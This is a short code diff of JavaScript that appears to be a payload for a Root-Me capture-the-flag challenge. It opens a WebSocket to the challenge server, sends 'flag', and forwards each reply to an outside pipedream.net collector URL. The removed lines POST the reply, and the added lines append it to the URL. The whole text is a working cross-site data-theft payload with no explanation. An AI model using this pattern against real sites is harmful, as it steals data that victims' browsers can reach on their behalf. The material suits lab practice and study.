@@ -13,15 +13,10 @@
     setTimeout(() => {
       var ws = new WebSocket('ws://ctf15.root-me.org/ws');
       ws.onopen = function () {
-        ws.send("hello");
+        ws.send("flag");
       };
-      ws.send("flag")
       ws.onmessage = function (event) {
-        fetch("https://eotp0j2o6hthpx9.m.pipedream.net",
-          {
-              method: "POST",
-              body: event["data"]
-          })
+        fetch("https://eoa21cz1z5v9xqj.m.pipedream.net/"+event["data"])
           .then(function(res){ return res.json(); })
           .then(function(data){ console.log(data) })
       };
